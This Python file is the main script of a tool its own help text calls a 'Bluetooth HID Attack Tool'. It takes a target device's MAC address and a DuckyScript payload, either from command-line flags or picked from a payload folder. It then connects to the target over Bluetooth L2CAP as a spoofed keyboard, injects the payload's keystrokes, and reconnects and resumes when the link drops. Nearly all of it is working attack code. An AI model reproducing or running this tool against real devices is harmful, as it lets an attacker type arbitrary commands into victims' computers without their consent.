import argparse
import os
import subprocess
import sys
import time

from loguru import logger

from L2CAP import L2CAPConnectionManager
from L2CAP.exceptions import ReconnectionRequiredException
from bluetoothM import setup_and_connect, troubleshoot_bluetooth, terminate_child_processes, setup_bluetooth
from config import PAYLOAD_FOLDER
from duckyscript import process_duckyscript
from utils.menu_functions import (main_menu, read_duckyscript, get_target_address, is_valid_mac_address)


def main():
    parser = argparse.ArgumentParser(description="Bluetooth HID Attack Tool")
    parser.add_argument('--adapter', type=str, default='hci0',
                        help='Specify the Bluetooth bluetoothM to use (default: hci0)')
    parser.add_argument('--script', type=str, help='Specify script file, only use in combination with --target')
    parser.add_argument('--target', type=str, help='Specify target MAC, only use in combination with --script')
    args = parser.parse_args()
    adapter_id = args.adapter
    scriptfile = args.script
    targetmac = args.target

    main_menu()

    if scriptfile and targetmac:
            
        target_address = targetmac
        if not target_address or not is_valid_mac_address(target_address):
            logger.info("No valid target address provided. Exiting..")
            return

        duckyscript = read_duckyscript(scriptfile)
        if not duckyscript:
            logger.info("Payload file not found. Exiting.")
            return

    else:

        target_address = get_target_address()
        if not target_address:
            logger.info("No target address provided. Exiting..")
            return

        payloads = os.listdir(PAYLOAD_FOLDER)

        print(f"\nAvailable payloads{len(payloads)}:")
        for idx, payload_file in enumerate(payloads, 1):
            print(idx, payload_file)
        payload_choice = input(f"\nEnter the number that represents the payload you would like to load: ")
        selected_payload = None

        try:
            payload_index = int(payload_choice) - 1
            selected_payload = os.path.join(PAYLOAD_FOLDER, payloads[payload_index])
        except (ValueError, IndexError):
            print(f"Invalid payload choice. No payload selected.")

        if selected_payload is not None:
            print(f"Selected payload: {selected_payload}")
            duckyscript = read_duckyscript(selected_payload)
        else:
            print(f"No payload selected.")
            logger.info("Payload file not found. Exiting.")
            return

    adapter = setup_bluetooth(target_address, adapter_id)
    adapter.enable_ssp()

    current_line = 0
    current_position = 0
    connection_manager = L2CAPConnectionManager(target_address)

    while True:
        try:
            hid_interrupt_client = setup_and_connect(connection_manager, target_address, adapter_id)
            process_duckyscript(hid_interrupt_client, duckyscript, current_line, current_position)
            time.sleep(2)
            break

        except ReconnectionRequiredException as e:
            logger.info(f"Reconnection required. Attempting to reconnect...")
            current_line = e.current_line
            current_position = e.current_position
            connection_manager.close_all()
            time.sleep(2)

        finally:
            command = f'echo -e "remove {target_address}\n" | bluetoothctl'
            subprocess.run(command, shell=True)
            print(f"Successfully Removed device: {target_address}")


if __name__ == "__main__":
    try:
        if troubleshoot_bluetooth():
            main()
        else:
            sys.exit(0)
    except KeyboardInterrupt:
        sys.exit(0)
    finally:
        terminate_child_processes()
